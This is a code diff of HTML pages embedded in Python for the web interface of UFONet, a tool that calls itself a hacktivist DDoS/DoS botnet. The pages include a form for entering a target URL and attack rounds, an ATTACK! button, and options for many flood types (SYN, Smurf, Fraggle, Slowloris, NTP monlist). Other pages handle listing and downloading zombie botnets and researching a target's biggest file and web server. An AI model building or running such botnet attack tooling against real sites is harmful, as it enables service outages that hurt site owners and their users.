-  * Test Botnet: <br><br><center><a href='javascript:runCommandX("cmd_test_offline")'>Offline</a> | <a href='javascript:runCommandX("cmd_test_all")'>ALL</a> | <a href='javascript:runCommandX("cmd_test_army")'>Zombies</a> | <a href='javascript:runCommandX("cmd_test_rpcs")'>XML-RPCs</a> | <a href='javascript:runCommandX("cmd_attack_me")'>Attack Me!</a></center></td>
+Download Botnet: <center><br><a href='javascript:runCommandX("cmd_list_nodes")'>LIST NODES</a> <input type="text" name="download_botnet_ip" id="download_botnet_ip" size="20" value='"""+default_blackhole+"""'> <button title="Start to search for zombies..." style="color:yellow; height:40px; width:140px; font-weight:bold; background-color:red; border: 2px solid yellow;" onClick=Download_Botnet_IP()>TAKE IT!</button></center>
+<hr>
+Test Botnet: <center><br><a href='javascript:runCommandX("cmd_test_offline")'>Offline</a> | <a href='javascript:runCommandX("cmd_test_all")'>ALL</a> | <a href='javascript:runCommandX("cmd_test_army")'>Zombies</a> | <a href='javascript:runCommandX("cmd_test_rpcs")'>XML-RPCs</a> | <a href='javascript:runCommandX("cmd_attack_me")'>Attack Me!</a></center>
+<hr>
+View Botnet: <button title="Build a map and geo-deploy your botnet on it..." onclick="Maps()">Generate map!</button></pre>
+</td>
 <td>
 <table cellpadding="5" cellspacing="2">
 <tr>
-<td><table><tr><td><img src='data:image/png;base64,"""+self.alien3_img+"""' onclick="Blackholes()"></td></tr><tr><td align="right"><a href="javascript:Blackholes()">GLOBAL.WARPS</a></td></tr></table></td>
-</tr>
-<tr>
-<table><tr>
-<td>Total Botnet = <b><a href='javascript:runCommandX("cmd_list_army")'><font size='5'>"""+ self.total_botnet +"""</font></a></b></td>
+<td align="right">Total Botnet = <b><a href='javascript:runCommandX("cmd_list_army")'><font size='5'>"""+ self.total_botnet +"""</font></a></b></td>
 </tr>
 <tr><td><hr></td></tr>
 <tr><td><table align="right"><tr><td>Zombies:</td><td><a href='javascript:runCommandX("cmd_list_zombies")'>"""+self.num_zombies+"""</a></td></tr></table></td></tr>
@@ -3102,10 +3218,15 @@ function HideAll()
 <tr><td><table align="right"><tr><td>NTPs:</td><td><a href='javascript:runCommandX("cmd_list_ntps")'>"""+self.num_ntps+"""</a></td></tr></table></td></tr>
 <tr><td><table align="right"><tr><td>DNSs:</td><td><a href='javascript:runCommandX("cmd_list_dnss")'>"""+self.num_dnss+"""</a></td></tr></table></td></tr>
 <tr><td><table align="right"><tr><td>SNMPs:</td><td><a href='javascript:runCommandX("cmd_list_snmps")'>"""+self.num_snmps+"""</a></td></tr></table></td></tr>
+<tr><td><hr></td></tr>
+<tr>
+<td align="right">GLOBAL.RADAR (nodes) = <b><font size='5' align="right"><a href="/radar" target="_blank">"""+str(len(self.list_globalnet))+"""</a></font></b></td>
+</tr>
+<tr>
+<td align="right">SHIP.WARPS (nodes) = <b><font size='5' align="right"><a href="/blackholes" target="_blank">"""+str(len(self.list_blackholes))+"""</a></font></b></td>
+</tr>
 </table>
 </table>
-</td>
-</tr></table>
 </td>
 </tr></table>
 <hr>
@@ -3115,12 +3236,6 @@ function HideAll()
         self.pages["/attack"] = self.pages["/header"] + """<script language="javascript"> 
 function Requests() {
         var win_requests = window.open("requests","_blank","fullscreen=no, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
-      }
-function Grid() {
-        var win_requests = window.open("grid","_blank","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
-      }
-function Wargames() {
-        var win_requests = window.open("wargames","_blank","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
       }
 function ShowPanel() {
         if (document.getElementById("extra_attack").checked){
@@ -3226,9 +3341,9 @@ function Start(){
 <div class="ringMenu">
 <ul>
   <li class="main"><a href="attack">Attack</a></li>
-  <li class="top"><a href="help">Help</a></li>
+  <li class="top"><a href="globalnet">Globalnet</a></li>
   <li class="right"><a href="botnet">Botnet</a></li>
-  <li class="bottom"><a href="inspect">Inspect</a></li>
+  <li class="bottom"><a href="explore">Explore</a></li>
   <li class="left"><a href="gui">RETURN</a></li>
 </ul>
 </div>
@@ -3237,47 +3352,45 @@ function Start(){
 <table bgcolor="black" cellpadding="24" cellspacing="25" border="1">
 <tr><td>
 <pre>
-  * Set your target:     <input type="text" name="target" id="target" size="30" placeholder="http(s)://" required pattern="https?://.+">
+  Set your target:     <input type="text" name="target" id="target" size="30" placeholder="http(s)://" required pattern="https?://.+">
 
-  * Set place to attack: <input type="text" name="path" id="path" size="30" placeholder="/path/big.jpg">
+  Set place to attack: <input type="text" name="path" id="path" size="30" placeholder="/path/big.jpg">
 
-  * Number of rounds:    <input type="text" name="rounds" id="rounds" size="5" value="1">
+  Number of rounds:    <input type="text" name="rounds" id="rounds" size="5" value="1">
 
 <hr>
   <button title="Configure how you will perform requests (proxy, HTTP headers, etc)..." onclick="Requests()">Configure requests</button> | <input type="checkbox" name="visual_attack" id="visual_attack"> Generate map! | <input type="checkbox" name="extra_attack" id="extra_attack" onclick='javascript:ShowPanel();'> Extra(s)
 
 <hr><div id="extra_panel" style="display:none;">
 <table bgcolor="black" cellpadding="4" cellspacing="5" border="1"><tr>
-<td align="left">* <a href="https://en.wikipedia.org/wiki/Low_Orbit_Ion_Cannon" target="_blank">LOIC</a>:</td><td align="right">   <input type="text" name="loic" id="loic" size="4" placeholder="100"></td>
-<td align="left">* <a href="https://en.wikipedia.org/wiki/Slowloris_(software)" target="_blank">LORIS</a>:</td><td align="right">  <input type="text" name="loris" id="loris" size="4" placeholder="101"></td>
-<td align="left">* <a href="https://en.wikipedia.org/wiki/SYN_flood" target="_blank">UFOSYN</a>:</td><td align="right"> <input type="text" name="ufosyn" id="ufosyn" size="4" placeholder="100"></td>
-<td align="left">* <a href="https://en.wikipedia.org/wiki/Fraggle_attack" target="_blank">FRAGGLE</a>:</td><td align="right"> <input type="text" name="fraggle" id="fraggle" size="4" placeholder="101"></td>
+<td align="left"><a href="https://en.wikipedia.org/wiki/Low_Orbit_Ion_Cannon" target="_blank">LOIC</a>:</td><td align="right">   <input type="text" name="loic" id="loic" size="4" placeholder="100"></td>
+<td align="left"><a href="https://en.wikipedia.org/wiki/Slowloris_(software)" target="_blank">LORIS</a>:</td><td align="right">  <input type="text" name="loris" id="loris" size="4" placeholder="101"></td>
+<td align="left"><a href="https://en.wikipedia.org/wiki/SYN_flood" target="_blank">UFOSYN</a>:</td><td align="right"> <input type="text" name="ufosyn" id="ufosyn" size="4" placeholder="100"></td>
+<td align="left"><a href="https://en.wikipedia.org/wiki/Fraggle_attack" target="_blank">FRAGGLE</a>:</td><td align="right"> <input type="text" name="fraggle" id="fraggle" size="4" placeholder="101"></td>
 </tr><tr>
-<td align="left">* <a href="https://ddos-guard.net/en/terminology/attack_type/rst-or-fin-flood" target="_blank">UFORST</a>:</td><td align="right"> <input type="text" name="uforst" id="uforst" size="4" placeholder="101"></td>
-<td align="left">* <a href="https://en.wikipedia.org/wiki/DRDOS" target="_blank">SPRAY</a>:</td><td align="right">  <input type="text" name="spray" id="spray" size="4" placeholder="110"></td>
-<td align="left">* <a href="https://en.wikipedia.org/wiki/Smurf_attack" target="_blank">SMURF</a>:</td><td align="right">  <input type="text" name="smurf" id="smurf" size="4" placeholder="100"></td>
-<td align="left">* <a href="https://en.wikipedia.org/wiki/Christmas_tree_packet" target="_blank">XMAS</a>:</td><td align="right">   <input type="text" name="xmas" id="xmas" size="4" placeholder="111"></td>
+<td align="left"><a href="https://ddos-guard.net/en/terminology/attack_type/rst-or-fin-flood" target="_blank">UFORST</a>:</td><td align="right"> <input type="text" name="uforst" id="uforst" size="4" placeholder="101"></td>
+<td align="left"><a href="https://en.wikipedia.org/wiki/DRDOS" target="_blank">SPRAY</a>:</td><td align="right">  <input type="text" name="spray" id="spray" size="4" placeholder="110"></td>
+<td align="left"><a href="https://en.wikipedia.org/wiki/Smurf_attack" target="_blank">SMURF</a>:</td><td align="right">  <input type="text" name="smurf" id="smurf" size="4" placeholder="100"></td>
+<td align="left"><a href="https://en.wikipedia.org/wiki/Christmas_tree_packet" target="_blank">XMAS</a>:</td><td align="right">   <input type="text" name="xmas" id="xmas" size="4" placeholder="111"></td>
 </tr><tr>
-<td align="left">* <a href="https://en.wikipedia.org/wiki/IP_fragmentation_attack" target="_blank">DROPER</a>:</td><td align="right">   <input type="text" name="droper" id="droper" size="4" placeholder="101"></td>
-<td align="left">* <a href="https://www.imperva.com/learn/application-security/snmp-reflection/" target="_blank">SNIPER</a>:</td><td align="right">   <input type="text" name="sniper" id="sniper" size="4" placeholder="100"></td>
-<td align="left">* <a href="https://www.us-cert.gov/ncas/alerts/TA13-088A" target="_blank">TACHYON</a>:</td><td align="right">   <input type="text" name="tachyon" id="tachyon" size="4" placeholder="100"></td>
-<td align="left">* <a href="https://www.cloudflare.com/learning/ddos/ping-icmp-flood-ddos-attack/" target="_blank">PINGER</a>:</td><td align="right">   <input type="text" name="pinger" id="pinger" size="4" placeholder="101"></td>
+<td align="left"><a href="https://en.wikipedia.org/wiki/IP_fragmentation_attack" target="_blank">DROPER</a>:</td><td align="right">   <input type="text" name="droper" id="droper" size="4" placeholder="101"></td>
+<td align="left"><a href="https://www.imperva.com/learn/application-security/snmp-reflection/" target="_blank">SNIPER</a>:</td><td align="right">   <input type="text" name="sniper" id="sniper" size="4" placeholder="100"></td>
+<td align="left"><a href="https://www.us-cert.gov/ncas/alerts/TA13-088A" target="_blank">TACHYON</a>:</td><td align="right">   <input type="text" name="tachyon" id="tachyon" size="4" placeholder="100"></td>
+<td align="left"><a href="https://www.cloudflare.com/learning/ddos/ping-icmp-flood-ddos-attack/" target="_blank">PINGER</a>:</td><td align="right">   <input type="text" name="pinger" id="pinger" size="4" placeholder="101"></td>
 </tr><tr>
-<td align="left">* <a href="https://www.us-cert.gov/ncas/alerts/TA14-013A" target="_blank">MONLIST</a>:</td><td align="right">   <input type="text" name="monlist" id="monlist" size="4" placeholder="101"></td>
-<td align="left">* <a href="https://www.f5.com/services/resources/glossary/push-and-ack-flood" target="_blank">UFOACK</a>:</td><td align="right">   <input type="text" name="ufoack" id="ufoack" size="4" placeholder="100"></td>
-<td align="left">* <a href="https://cyberhoot.com/cybrary/fragment-overlap-attack/" target="_blank">OVERLAP</a>:</td><td align="right">   <input type="text" name="overlap" id="overlap" size="4" placeholder="100"></td>
-<td align="left">* <a href="https://en.wikipedia.org/wiki/UDP_flood_attack" target="_blank">UFOUDP</a>:</td><td align="right">   <input type="text" name="ufoudp" id="ufoudp" size="4" placeholder="101"></td>
+<td align="left"><a href="https://www.us-cert.gov/ncas/alerts/TA14-013A" target="_blank">MONLIST</a>:</td><td align="right">   <input type="text" name="monlist" id="monlist" size="4" placeholder="101"></td>
+<td align="left"><a href="https://www.f5.com/services/resources/glossary/push-and-ack-flood" target="_blank">UFOACK</a>:</td><td align="right">   <input type="text" name="ufoack" id="ufoack" size="4" placeholder="100"></td>
+<td align="left"><a href="https://cyberhoot.com/cybrary/fragment-overlap-attack/" target="_blank">OVERLAP</a>:</td><td align="right">   <input type="text" name="overlap" id="overlap" size="4" placeholder="100"></td>
+<td align="left"><a href="https://en.wikipedia.org/wiki/UDP_flood_attack" target="_blank">UFOUDP</a>:</td><td align="right">   <input type="text" name="ufoudp" id="ufoudp" size="4" placeholder="101"></td>
 </tr><tr>
-<td align="left">* <a href="https://dl.packetstormsecurity.net/papers/general/tcp-starvation.pdf" target="_blank">NUKE</a>:</td><td align="right">   <input type="text" name="nuke" id="nuke" size="4" placeholder="1001"></td>
+<td align="left"><a href="https://dl.packetstormsecurity.net/papers/general/tcp-starvation.pdf" target="_blank">NUKE</a>:</td><td align="right">   <input type="text" name="nuke" id="nuke" size="4" placeholder="1001"></td>
 </tr>
 </table>
 <hr>
-  * Set db stress parameter:   <input type="text" name="dbstress" id="dbstress" size="22" placeholder="search.php?q=">
+  Set db stress parameter:   <input type="text" name="dbstress" id="dbstress" size="22" placeholder="search.php?q=">
 
 <hr></div>
   <button title="Start to attack your target..." onClick=Start() style="color:yellow; height:40px; width:240px; font-weight:bold; background-color:red; border: 2px solid yellow;" id="attack_button">ATTACK!</button> | Total Botnet = <b><a href='javascript:runCommandX("cmd_list_army")'><font size='5'>"""+ self.total_botnet +"""</font></a></b></pre>
-</td><td>
-<table><tr><td><table><tr><td><img src='data:image/png;base64,"""+self.alien6_img+"""' onclick="Grid()"></td></tr><tr><td align="right"><a href="javascript:Grid()">GLOBAL.GRID</a></td></tr></table></td></tr><tr><td><table><tr><td><img src='data:image/png;base64,"""+self.alien8_img+"""' onclick="Wargames()"></td></tr><tr><td align="right"><a href="javascript:Wargames()">GLOBAL.WARGAMES</a></td></tr></table></td></tr></table>
 </td></tr></table>
  </td></tr></table>
 <hr>
@@ -3299,6 +3412,117 @@ function show(one) {
             }
       }
 }
+function Games() {
+        var win_requests = window.open("games","_blank","fullscreen=yes, scrollbars=1, titlebar=no, toolbar=no, location=no, status=no, menubar=no, top=190, left=360, width=640, height=480, resizable=yes", false);
+      }
+function Browser() {
+        var win_requests = window.open("browser","_blank","fullscreen=yes, scrollbars=1, titlebar=no, toolbar=no, location=no, status=no, menubar=no, top=190, left=360, width=640, height=480, resizable=yes", false);
+      }
+</script>
+<style>.container{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;}svg{max-width:8rem;}.masking{-webkit-transform: scale(0);transform:scale(0);-webkit-transform-origin:178px;transform-origin:178px;-webkit-animation: scale 3s linear infinite; animation: scale 3s linear infinite;}@-webkit-keyframes scale{80%{opacity: 1;}100%{-webkit-transform: scale(1);transform: scale(1);opacity: 0;}}@keyframes scale{80% {opacity: 1;}100%{-webkit-transform: scale(1);transform: scale(1);opacity: 0;}}</style>
+</head>
+<body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
+<canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
+<center>
+<table cellpadding="38" cellspacing="38">
+<tr>
+ <td>
+<table cellpadding="24" cellspacing="25" border="1">
+<tr>
+<td>
+<center>
+<a href="javascript:alert('DAIALAFSÄ & LUÄRKS says: Hi! """ + self.ranking + """, The first steps are easy ... RTFM! ;-)');"><img src='data:image/png;base64,"""+self.aliens_img+"""'></a>
+</center>
+</td>
+<td><pre>
+<div><a id="mH1" href="javascript:show('nb1');" style="text-decoration: none;" >+ Project info</a></div>
+<div class="nb" id="nb1" style="display: none;">  <b>UFONet</b> - Is a set of <a href="https://en.wikipedia.org/wiki/Hacktivism" target="_blank">hacktivist</a> tools that allow launching coordinated 
+           <a href="https://en.wikipedia.org/wiki/Distributed_denial-of-service" target="_blank">DDoS</a> and <a href="https://en.wikipedia.org/wiki/Denial-of-service_attack" target="_blank">DoS</a> attacks and combine both in a single offensive.
+
+           It also works as an encrypted <a href="https://en.wikipedia.org/wiki/Darknet" target="_blank">DarkNET</a> to publish and receive
+           content by creating a global client/server network based on 
+           a direct-connect <a href="https://en.wikipedia.org/wiki/Peer-to-peer" target="_blank">P2P</a> architecture.</div><div><a id="mH3" href="javascript:show('nb3');" style="text-decoration: none;" >+ F.A.Q.</a></div><div class="nb" id="nb3" style="display: none;">
+    - <a href="https://ufonet.03c8.net/FAQ.html" target="_blak">Online version</a> (updated!)
+    - <a href="/faq" target="_blank">Local version</a></div>
+<div><a id="mH4" href="javascript:show('nb4');" style="text-decoration: none;" >+ Issues</a></div><div class="nb" id="nb4" style="display: none;">
+  If you have questions (or technical problems)
+  try to solve them following next link:
+
+      - <a href="https://github.com/epsylon/ufonet/issues" target="_blank">GitHub</a> issues</div>
+<div><a id="mH5" href="javascript:show('nb5');" style="text-decoration: none;" >+ Support</a></div> <div class="nb" id="nb5" style="display: none;">    - Testing; use the tool and search for possible bugs and new ideas
+    - Coding; you can try to develop more features
+    - Promoting; talk about UFONet on the internet, events, <a href="https://en.wikipedia.org/wiki/Hacklab" target="_blank">hacklabs</a>, etc
+    - Donating; money, objects, privacy, exploits, <a href="https://en.wikipedia.org/wiki/Love" target="_blank">love</a> ;-)
+
+      - <a href="https://explorer.bitcoin.com/btc" target="_blank">Bitcoin [BTC]</a>: <b>19aXfJtoYJUoXEZtjNwsah2JKN9CK5Pcjw</b>
+      - <a href="https://ecoin.03c8.net/blockexplorer" target="_blank">Ecoin [ECO]</a>: <b>ETsRCBzaMawx3isvb5svX7tAukLdUFHKze</b></div> <div><a id="mH6" href="javascript:show('nb6');" style="text-decoration: none" >+ Contact</a></div> <div class="nb" id="nb6" style="display: none;">   - <a target="_blank" href="wormhole">Wormhole</a>: irc.freenode.net / #ufonet
+   - Email: <a href="mailto: epsylon@riseup.net">epsylon@riseup.net</a> [GPG:0xB8AC3776]
+</div></td></tr>
+<tr>
+<td># TREEMAP: <a href="/treemap" target="_blank">VIEW</a> | SHIP.BROWSER: <a href="javascript:Browser()">OPEN</a> | SHIP.GAMES: <a href="javascript:Games()">PLAY!</a> #
+</td></tr>
+<tr>
+<td><h2><u>Types of Attacks:</u></h2> 
+<table cellpadding="5" cellspacing="5" border="1"><tr>
+<td><a href="https://hydrasky.com/network-security/layer-7-ddos-attack/" target="_blank">LAYER-7</a></td>
+<td><a href="https://en.wikipedia.org/wiki/Low_Orbit_Ion_Cannon" target="_blank">LOIC</a></td>
+<td><a href="https://en.wikipedia.org/wiki/Slowloris_(software)" target="_blank">LORIS</a></td>
+<td><a href="https://en.wikipedia.org/wiki/SYN_flood" target="_blank">UFOSYN</a></td>
+<td><a href="https://en.wikipedia.org/wiki/Fraggle_attack" target="_blank">FRAGGLE</a></td>
+<td><a href="https://ddos-guard.net/en/terminology/attack_type/rst-or-fin-flood" target="_blank">UFORST</a></td>
+<td><a href="https://en.wikipedia.org/wiki/DRDOS" target="_blank">SPRAY</a></td>
+<td><a href="https://en.wikipedia.org/wiki/Smurf_attack" target="_blank">SMURF</a></td>
+<td><a href="https://en.wikipedia.org/wiki/Christmas_tree_packet" target="_blank">XMAS</a></td></tr><tr>
+<td><a href="https://en.wikipedia.org/wiki/IP_fragmentation_attack" target="_blank">DROPER</a></td>
+<td><a href="https://www.imperva.com/learn/application-security/snmp-reflection/" target="_blank">SNIPER</a></td>
+<td><a href="https://www.us-cert.gov/ncas/alerts/TA13-088A" target="_blank">TACHYON</a></td>
+<td><a href="https://www.cloudflare.com/learning/ddos/ping-icmp-flood-ddos-attack/" target="_blank">PINGER</a></td>
+<td><a href="https://www.us-cert.gov/ncas/alerts/TA14-013A" target="_blank">MONLIST</a></td>
+<td><a href="https://www.f5.com/services/resources/glossary/push-and-ack-flood" target="_blank">UFOACK</a></td>
+<td><a href="https://cyberhoot.com/cybrary/fragment-overlap-attack/" target="_blank">OVERLAP</a></td>
+<td><a href="https://en.wikipedia.org/wiki/UDP_flood_attack" target="_blank">UFOUDP</a></td>
+<td><a href="https://dl.packetstormsecurity.net/papers/general/tcp-starvation.pdf" target="_blank">NUKE</a></td>
+</tr></table></td><tr>
+<tr>
+<td><h2><u>GUI-Modules:</u></h2>
+<table cellpadding="15" cellspacing="15" border="1"><tr>
+<td><a href="/news" target="_blank"><img src='data:image/png;base64,"""+self.alien1_img+"""'></a></td><td>Read NEWS from other motherships</td><td><a href="/news" target="_blank">SHIP.NEWS</a></td></tr><tr>
+<td><a href="/missions" target="_blank"><img src='data:image/png;base64,"""+self.alien2_img+"""'></a></td><td>Read MISSIONS from other motherships</td><td><a href="/missions" target="_blank">SHIP.MISSIONS</a></td></tr><tr>
+<td><a href="/tv" target="_blank"><img src='data:image/png;base64,"""+self.alien5_img+"""'></a></td><td>Watch TV/VIDEOS from other mothership</td><td><a href="/tv" target="_blank">SHIP.TV</a></td></tr><tr>
+<td><a href="/links" target="_blank"><img src='data:image/png;base64,"""+self.alien10_img+"""'></a></td><td>Check LINKS from other motherships</td><td><a href="/links" target="_blank">GLOBAL.LINKS</a></td></tr><tr>
+<td><a href="/streams" target="_blank"><img src='data:image/png;base64,"""+self.alien9_img+"""'></a></td><td>Watch STREAMS from other motherships</td><td><a href="/streams" target="_blank">GLOBAL.STREAMS</a></td></tr><tr>
+<td><a href="/radar" target="_blank"><img src='data:image/png;base64,"""+self.alien11_img+"""'></a></td><td>Search for OTHER motherships</td><td><a href="/radar" target="_blank">GLOBAL.RADAR</a></td></tr><tr>
+<td><a href="/blackholes" target="_blank"><img src='data:image/png;base64,"""+self.alien3_img+"""'></a></td><td>Search for BLACKHOLES from other motherships</td><td><a href="/blackholes" target="_blank">SHIP.WARPS</a></td></tr><tr>
+<td><a href="/inspect" target="_blank"><img src='data:image/png;base64,"""+self.alien7_img+"""'></a></td><td>Research for INFORMATION about a target</td><td><a href="/inspect" target="_blank">SHIP.INSPECT</a><br><br><a href="/abduction" target="_blank">SHIP.ABDUCTION</a></td></tr><tr>
+<td><a href="/board" target="_blank"><img src='data:image/png;base64,"""+self.alien4_img+"""'></a></td><td>Send/Receive MESSAGES from other motherships</td><td><a href="/board" target="_blank">GLOBAL.BOARD</a></td></tr><tr>
+<td><a href="/grid" target="_blank"><img src='data:image/png;base64,"""+self.alien6_img+"""'></a></td><td>Review STATISTICS from other motherships</td><td><a href="/grid" target="_blank">GLOBAL.GRID</a></td></tr><tr>
+<td><a href="/wargames" target="_blank"><img src='data:image/png;base64,"""+self.alien8_img+"""'></a></td><td>Join WARGAMES from other motherships</td><td><a href="/wargames" target="_blank">GLOBAL.WARGAMES</a></td></tr><tr>
+<td><a href="/browser" target="_blank"><img src='data:image/png;base64,"""+self.alien13_img+"""'></a></td><td>Surf INTERNET from your mothership</td><td><a href="/browser" target="_blank">SHIP.BROWSER</a></td></tr><tr>
+<td><a href="/games" target="_blank"><img src='data:image/png;base64,"""+self.alien12_img+"""'></a></td><td>Play GAMES from your mothership</td><td><a href="/games" target="_blank">SHIP.GAMES</a></td>
+</tr></table>
+</td></tr>
+</table>
+</td></tr></table>
+""" + self.pages["/footer"]
+
+        self.pages["/faq"] = self.pages["/header"] + """<style>.container{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;}svg{max-width:8rem;}.masking{-webkit-transform: scale(0);transform:scale(0);-webkit-transform-origin:178px;transform-origin:178px;-webkit-animation: scale 3s linear infinite; animation: scale 3s linear infinite;}@-webkit-keyframes scale{80%{opacity: 1;}100%{-webkit-transform: scale(1);transform: scale(1);opacity: 0;}}@keyframes scale{80% {opacity: 1;}100%{-webkit-transform: scale(1);transform: scale(1);opacity: 0;}}</style>
+</head>
+<body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
+<canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
+<center>
+<table cellpadding="38" cellspacing="38">
+<tr>
+ <td>"""+self.faq_text+"""</td></tr>
+</table>
+""" + self.pages["/footer"]
+
+        self.pages["/globalnet"] = self.pages["/header"] + """<script language="javascript"> 
+function Blackholes() {
+        var win_requests = window.open("blackholes","_blank","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
+      }
+function Radar() {
+        var win_requests = window.open("radar","_blank","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
+      }
 </script>
 <style>.container{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;}svg{max-width:8rem;}.masking{-webkit-transform: scale(0);transform:scale(0);-webkit-transform-origin:178px;transform-origin:178px;-webkit-animation: scale 3s linear infinite; animation: scale 3s linear infinite;}@-webkit-keyframes scale{80%{opacity: 1;}100%{-webkit-transform: scale(1);transform: scale(1);opacity: 0;}}@keyframes scale{80% {opacity: 1;}100%{-webkit-transform: scale(1);transform: scale(1);opacity: 0;}}</style>
 </head>
@@ -3310,9 +3534,9 @@ function show(one) {
  <td>
 <div class="ringMenu">
 <ul>
-  <li class="main"><a href="help">Help</a></li>
+  <li class="main"><a href="globalnet">Globalnet</a></li>
   <li class="top"><a href="botnet">Botnet</a></li>
-  <li class="right"><a href="inspect">Inspect</a></li>
+  <li class="right"><a href="explore">Explore</a></li>
   <li class="bottom"><a href="attack">Attack</a></li>
   <li class="left"><a href="gui">RETURN</a></li>
 </ul>
@@ -3321,47 +3545,100 @@ function show(one) {
  <td>
 <table cellpadding="24" cellspacing="25" border="1">
 <tr>
+  <td><a href="javascript:alert('Senator M.BIRDY says: Welcome ..., """ + self.ranking + """,... These are other visible motherships detected by our technology that are currently working for the Federation... You can contribute by uploading your location... Remember, to be a strong network always depends on you!');"><img src='data:image/png;base64,"""+self.alien11_img+"""'></a></td>
 <td>
-<a href="javascript:alert('DAIALAFSÄ & LUÄRKS says: Hi! """ + self.ranking + """, The first steps are easy ... RTFM! ;-)');"><img src='data:image/png;base64,"""+self.aliens_img+"""'></a>
-</td>
-<td><pre>
-<div><a id="mH1" href="javascript:show('nb1');" style="text-decoration: none;" >+ Project info</a></div>
-<div class="nb" id="nb1" style="display: none;">  <b>UFONet</b> - is a set of tools designed to launch <a href="https://en.wikipedia.org/wiki/Distributed_denial-of-service" target="_blank">DDoS</a> and <a href="https://en.wikipedia.org/wiki/Denial-of-service_attack" target="_blank">DoS</a> attacks
-            and that allows to combine both in a single offensive.
-   </div><div><a id="mH2" href="javascript:show('nb2');" style="text-decoration: none;" >+ How does it work?</a></div> <div class="nb" id="nb2" style="display: none;">  You can read more info on next links:
+<ul>
+<li><a href="javascript:Radar()">GLOBAL.RADAR</a>: Search for <u>other visible motherships</u></li>
+</ul>
+</td> 
+</tr>
+<tr>
+<td><a href="javascript:alert('Dhïkta says: """ + self.ranking + """... I can open warps directly to blackholes created by other motherships. This is nice to share and increase your legion on a crypto-distributed (P2P) way...');"><img src='data:image/png;base64,"""+self.alien3_img+"""'></a></td>
+<td>
+<ul>
+<li><a href="javascript:Blackholes()">SHIP.WARPS</a>: Search for <u>blackholes shared by other motherships</u></li>
+</ul>
+</td> 
+</tr>
+</table> </td></tr></table>
+""" + self.pages["/footer"]
 
-      - <a href="https://cwe.mitre.org/data/definitions/601.html" target="_blank">CWE-601:Open Redirect</a>
-      - <a href="https://www.owasp.org/index.php/OWASP_Periodic_Table_of_Vulnerabilities_-_URL_Redirector_Abuse2" target="_blank">OWASP:URL Redirector Abuse</a>
-      - <a href="https://ufonet.03c8.net/ufonet/ufonet-schema.png" target="_blank">UFONet:Botnet Schema</a></div> <div><a id="mH3" href="javascript:show('nb3');" style="text-decoration: none;" >+ How to start?</a></div> <div class="nb" id="nb3" style="display: none;">  All you need to start an attack is:
-   
-      - a list of '<a href="https://en.wikipedia.org/wiki/Zombie" target="_blank">zombies</a>'; to conduct their connections to your target
-      - a place; to efficiently hit your target</div> <div><a id="mH4" href="javascript:show('nb4');" style="text-decoration: none;" >+ Updating</a></div><div class="nb" id="nb4" style="display: none;">
-  This feature can be used <u>ONLY</u> if you have cloned UFONet.
+        self.pages["/explore"] = self.pages["/header"] + """<script language="javascript"> 
+function Abduction() {
+        var win_requests = window.open("abduction","_blank","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
+      }
+function Inspect() {
+        var win_requests = window.open("inspect","_blank","fullscreen=yes, scrollbars=1, titlebar=yes, top=180, left=320, width=720, height=460, resizable=yes", false);
+      }
+</script>
+<style>.container{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;}svg{max-width:8rem;}.masking{-webkit-transform: scale(0);transform:scale(0);-webkit-transform-origin:178px;transform-origin:178px;-webkit-animation: scale 3s linear infinite; animation: scale 3s linear infinite;}@-webkit-keyframes scale{80%{opacity: 1;}100%{-webkit-transform: scale(1);transform: scale(1);opacity: 0;}}@keyframes scale{80% {opacity: 1;}100%{-webkit-transform: scale(1);transform: scale(1);opacity: 0;}}</style>
+</head>
+<body bgcolor="black" text="yellow" style="font-family:Â Courier, 'Courier New', monospace;" onload="start()" onresize="resize()" onorientationchange="resize()" onmousedown="context.fillStyle='rgba(0,0,0,'+opacity+')'" onmouseup="context.fillStyle='rgb(0,0,0)'">
+<canvas id="starfield" style="z-index:-1; background-color:#000000; position:fixed; top:0; left:0;"></canvas>
+<center>
+<table cellpadding="38" cellspacing="38">
+<tr>
+ <td>
+<div class="ringMenu">
+<ul>
+  <li class="main"><a href="explore"">Explore</a></li>
+  <li class="top"><a href="botnet">Botnet</a></li>
+  <li class="right"><a href="globalnet">Globalnet</a></li>
+  <li class="bottom"><a href="attack">Attack</a></li>
+  <li class="left"><a href="gui">RETURN</a></li>
+</ul>
+</div>
+ </td>
+ <td>
+<table cellpadding="24" cellspacing="25" border="1">
+<tr>
+<td><a href="javascript:alert('Ofgöfeejh says: """ + self.ranking + """... Lets research about our enemies first, right?...');"><img src='data:image/png;base64,"""+self.alien7_img+"""'></a></td>
+<td>
+<ul>
+<li><a href="javascript:Inspect()">SHIP.INSPECT</a>: Search for <u>biggest file on target</u></li><br>
+<li><a href="javascript:Abduction()">SHIP.ABDUCTION</a>: Research for <u>information about target's web server</u></li>
+</ul>
+</td> 
